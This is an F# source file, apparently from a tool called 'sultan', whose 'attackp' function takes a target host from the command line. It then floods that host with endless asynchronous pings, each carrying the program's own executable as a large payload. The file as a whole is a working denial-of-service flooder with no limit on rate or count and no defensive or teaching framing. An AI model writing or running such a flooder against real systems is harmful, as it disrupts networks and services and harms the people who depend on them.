namespace sultan

open sultan
open sultan.printxlib

open System
open System.IO
open System.Net
open System.Text
open System.Net.NetworkInformation

open CommandLine
open CommandLine.Text

module pinglib =
    let nil : string = string (char 0x00)
    let data : string = File.ReadAllText((System.Reflection.Assembly.GetEntryAssembly().Location))

    type options = {
        [<Option('d', "host", Required = true)>] host : string;
    }

    let rec send (nth : int) (host : string)  =
        let pingSender : Ping = new Ping()
        let options : PingOptions = new PingOptions()

        let buffer : byte array = Encoding.ASCII.GetBytes(data)

        let timeout : int = 120
        pingSender.SendAsync(host, 10000000, buffer, options) |> ignore
        verbose ("pinged -> " + host + " " + (nth.ToString()) + " times")
        send (nth + 1) host

    let attackp (args : string[]) =
        let mutable param = Parser.Default.ParseArguments<options>(args)
        let mutable opt : options = Unchecked.defaultof<options>

        match param with
            | :? Parsed<options> as parsed ->
                opt <- parsed.Value
            | :? NotParsed<options> as notParsed ->
                errorfn ("300 invalid options. " + (**notParsed.Errors.[0] +**) "fatal.")
                exit 1

        let host = opt.host
        send 1 host 
